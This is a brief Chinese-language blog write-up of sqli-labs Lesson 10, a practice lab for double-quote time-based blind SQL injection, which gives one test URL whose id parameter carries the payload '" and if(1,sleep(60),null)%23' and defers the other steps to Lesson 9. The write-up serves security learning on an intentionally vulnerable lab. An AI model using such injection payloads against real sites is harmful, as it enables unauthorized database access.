---
title: sqli-labs-lession 10 GET双引号基于时间盲注
date: 2018-09-26 21:24:52
tags: [sqli-labs]
categories: sql注入
---
# sqli-labs-lession 10 GET双引号基于时间盲注 #
---

## 登录界面 ##

![1](/img/sql/Lesson-10/1.png)

## 注入过程 ##

题目已经提示我们了,跟Lesson-9一样是时间盲注,只是SQL语句中变量的闭合使用了双引号。

判断一下类型,其他的和Lesson-9步骤没有区别。

`http://10.60.250.151/sqlilabs/Less-10/?id=1" and if(1,sleep(60),null)%23`

![2](/img/sql/Lesson-10/2.png)

{% post_link sqli-labs-lession-9-GET单引号基于时间盲注 点击查看Lesson-9%}